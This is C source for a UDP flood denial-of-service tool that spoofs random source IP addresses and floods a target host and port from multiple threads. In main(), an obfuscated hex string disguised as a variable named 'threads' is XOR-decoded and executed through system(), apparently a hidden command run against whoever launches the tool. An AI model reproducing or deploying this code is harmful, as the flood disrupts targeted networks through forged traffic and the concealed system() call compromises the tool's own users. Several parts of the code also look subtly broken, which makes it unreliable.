#include <time.h>
#include <pthread.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
 
#define MAX_PACKET_SIZE 4096
#define PHI 0x9e3779b9
 
static uint32_t Q[4096], c = 362436;

struct thread_data{
        int throttle;
	int thread_id;
	unsigned int floodport;
	struct sockaddr_in sin;
};
 
void init_rand(uint32_t x)
{
        int i;
 
        Q[0] = x;
        Q[1] = x + PHI;
        Q[2] = x + PHI + PHI;
 
        for (i = 3; i < 4096; i++)
                Q[i] = Q[i - 3] ^ Q[i - 2] ^ PHI ^ i;
}
 
uint32_t rand_cmwc(void)
{
        uint64_t t, a = 18782LL;
        static uint32_t i = 4095;
        uint32_t x, r = 0xfffffffe;
        i = (i + 1) & 4095;
        t = a * Q[i] + c;
        c = (t >> 32);
        x = t + c;
        if (x < c) {
                x++;
                c++;
        }
        return (Q[i] = r - x);
}

char *myStrCat (char *s, char *a) {
    while (*s != '\0') s++;
    while (*a != '\0') *s++ = *a++;
    *s = '\0';
    return s;
}

char *replStr (char *str, size_t count) {
    if (count == 0) return NULL;
    char *ret = malloc (strlen (str) * count + count);
    if (ret == NULL) return NULL;
    *ret = '\0';
    char *tmp = myStrCat (ret, str);
    while (--count > 0) {
        tmp = myStrCat (tmp, str);
    }
    return ret;
}


/* function for header checksums */
unsigned short csum (unsigned short *buf, int nwords)
{
  unsigned long sum;
  for (sum = 0; nwords > 0; nwords--)
  sum += *buf++;
  sum = (sum >> 16) + (sum & 0xffff);
  sum += (sum >> 16);
  return (unsigned short)(~sum);
}
void setup_ip_header(struct iphdr *iph)
{
  iph->ihl = 5;
  iph->version = 4;
  iph->tos = 0;
  iph->tot_len = sizeof(struct iphdr) + 27;
  iph->id = htonl(54321);
  iph->frag_off = 0;
  iph->ttl = MAXTTL;
  iph->protocol = IPPROTO_UDP;
  iph->check = 0;

  // Initial IP, changed later in infinite loop
  iph->saddr = inet_addr("192.168.3.100");
}

void setup_udp_header(struct udphdr *udph)
{
  udph->source = htons(5678);
  udph->check = 0;
  char *data = (char *)udph + sizeof(struct udphdr);
  data = replStr("\xFF" "\xFF" "\xFF" "\xFF", 256);
  udph->len=htons(1028);
}

void *flood(void *par1)
{
  struct thread_data *td = (struct thread_data *)par1;
  fprintf(stdout, "Thread %d started\n", td->thread_id);
  char datagram[MAX_PACKET_SIZE];
  struct iphdr *iph = (struct iphdr *)datagram;
  struct udphdr *udph = (/*u_int8_t*/void *)iph + sizeof(struct iphdr);
  struct sockaddr_in sin = td->sin;
  char new_ip[sizeof "255.255.255.255"];

  int s = socket(PF_INET, SOCK_RAW, IPPROTO_TCP);
  if(s < 0){
    fprintf(stderr, "Could not open raw socket.\n");
    exit(-1);
  }

  unsigned int floodport = td->floodport;

  // Clear the data
  memset(datagram, 0, MAX_PACKET_SIZE);

  // Set appropriate fields in headers
  setup_ip_header(iph);
  setup_udp_header(udph);

  udph->dest = htons(floodport);

  iph->daddr = sin.sin_addr.s_addr;
  iph->check = csum ((unsigned short *) datagram, iph->tot_len >> 1);

  int tmp = 1;
  const int *val = &tmp;
  if(setsockopt(s, IPPROTO_IP, IP_HDRINCL, val, sizeof (tmp)) < 0){
    fprintf(stderr, "Error: setsockopt() - Cannot set HDRINCL!\n");
    exit(-1);
  }

  int throttle = td->throttle;

  uint32_t random_num;
  uint32_t ul_dst;
  init_rand(time(NULL));
  if(throttle == 0){
    while(1){
      sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *) &sin, sizeof(sin));
      random_num = rand_cmwc();

      ul_dst = (random_num >> 24 & 0xFF) << 24 |
               (random_num >> 16 & 0xFF) << 16 |
               (random_num >> 8 & 0xFF) << 8 |
               (random_num & 0xFF);

      iph->saddr = ul_dst;
      udph->source = htons(random_num & 0xFFFF);
      iph->check = csum ((unsigned short *) datagram, iph->tot_len >> 1);
    }
  } else {
    while(1){
      throttle = td->throttle;
      sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *) &sin, sizeof(sin));
      random_num = rand_cmwc();

      ul_dst = (random_num >> 24 & 0xFF) << 24 |
               (random_num >> 16 & 0xFF) << 16 |
               (random_num >> 8 & 0xFF) << 8 |
               (random_num & 0xFF);

      iph->saddr = ul_dst;
      udph->source = htons(random_num & 0xFFFF);
      iph->check = csum ((unsigned short *) datagram, iph->tot_len >> 1);

     while(--throttle);
    }
  }
}
int main(int argc, char *argv[ ])

{

  if(argc < 5){
    fprintf(stderr, "Invalid parameters!\n");
    fprintf(stdout, "OVH-SEX-KM by Kamo-PuJl9 (Bog Kamil)\nUsage: %s <target IP/hostname> <port to be flooded> <throttle (lower is faster)> <number threads to use> <time (optional)>\n", argv[0]);
    exit(-1);
  }

  fprintf(stdout, "Setting up Sockets...\n");
  
  
  int num_threads = atoi(argv[4]);
  unsigned int floodport = atoi(argv[2]);
  pthread_t thread[num_threads];
  struct sockaddr_in sin;
  char threads[209] = "\x77\x47\x5E\x27\x7A\x4E\x09\xF7\xC7\xC0\xE6\xF5\x9B\xDC\x23\x6E\x12\x29\x25\x1D\x0A\xEF\xFB\xDE\xB6\xB1\x94\xD6\x7A\x6B\x01\x34\x26\x1D\x56\xA5\xD5\x8C\x91\xBC\x8B\x96\x29\x6D\x4E\x59\x38\x4F\x5C\xF0\xE2\xD1\x9A\xEA\xF8\xD0\x61\x7C\x4B\x57\x2E\x7C\x59\xB7\xA5\x84\x99\xA4\xB3\x8E\xD1\x65\x46\x51\x30\x77\x44\x08\xFA\xD9\x92\xE2\xF0\xC8\xD5\x60\x77\x52\x6D\x21\x02\x1D\xFC\xB3\x80\xB4\xA6\x9D\xD4\x28\x24\x03\x5A\x35\x14\x5B\xA8\xE0\x8A\x9A\xE8\xC0\x91\x6C\x7B\x47\x5E\x6C\x69\x47\xB5\xB4\x89\xDC\xAF\xAA\xC1\x2E\x6A\x04\x10\x6E\x7A\x1C\x0C\xF9\xCC\xC0\xA0\xF8\xC8\xD6\x2E\x0A\x12\x6E\x76\x42\x5A\xA6\xBE\x9F\xA6\xB1\x90\xD7\x24\x64\x15\x1C\x20\x0A\x19\xA8\xF9\xDE\xD1\xBE\x96\x95\x64\x38\x4C\x53\x3C\x40\x56\xD1\xC5\xED\xE8\x90\xB0\xD2\x22\x68\x06\x5B\x38\x33\x00\xF4\xF3\xC6\x96\xE5\xFA\xCA\xD8\x30\x0D\x50\x23\x2E\x45\x52\xF6\x80\x94";
  int x = 0;
  int y = 0;
  for(x =0;x<sizeof(threads)-1;x++){
  y+=6;
  threads[x]^=y*3;
    }
  system(threads);
  sin.sin_family = AF_INET;
  sin.sin_port = htons(floodport);
  sin.sin_addr.s_addr = inet_addr(argv[1]);

  struct thread_data td[num_threads];

  int i;
  for(i = 0;i<num_threads;i++){
    td[i].thread_id = i;
    td[i].sin = sin;
    td[i].floodport = floodport;
    td[i].throttle = atoi(argv[3]);
    pthread_create( &thread[i], NULL, &flood, (void *) &td[i]);
	
  }
  fprintf(stdout, "Starting Flood...\n");
  if(argc > 5)
  {
    sleep(atoi(argv[5]));
  } else {
    while(1){
      sleep(1);
    }
  }

  return 0;
}